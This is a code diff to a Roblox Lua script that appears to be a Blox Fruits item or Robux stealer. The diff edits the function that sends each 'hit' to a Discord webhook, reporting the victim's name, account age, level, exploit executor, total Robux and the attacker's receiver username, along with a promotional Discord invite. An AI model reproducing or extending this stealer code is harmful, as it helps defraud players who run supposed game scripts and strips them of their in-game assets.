@@ -9,7 +9,7 @@ local result = 0
 
 local HttpService = game:GetService("HttpService")
 
-local success, UserId = pcall(function()
+local success = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
 end)
 
@@ -68,19 +68,19 @@ end)
 local function sendWebhook()
 
     local embed = {
-        ["title"] = "Blox Fruits Hit - Ft. Gaming Scripts",
+        ["title"] = "Gaming Scripts - You Got Blox Fruit Hit! :apple:",
         ["color"] = 39423,
         ["fields"] = {
             {
-                ["name"] = "<:drawpen:1311079366125555782> á´˜ÊŸá´€Êá´‡Ê€ ÉªÉ´êœ°á´",
-                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 💻 Executor Used: " ..identifyexecutor().. "```"
+                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
+                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 🚀 Level: " ..tostring(getLvl()).. "\n | 💻 Executor Used: " ..identifyexecutor().. "```"
             },
             {
-                ["name"] = "<:robux:1314309850154537020> á´›á´á´›á´€ÊŸ Ê€á´Ê™á´œx",
+                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                 ["value"] = "```" .. result .. "```"
             },
             {
-                ["name"] = "á´…Éªêœ±á´„á´Ê€á´… sá´‡Ê€á´ á´‡Ê€",
+                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
                 ["value"] = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)",
             }
         }
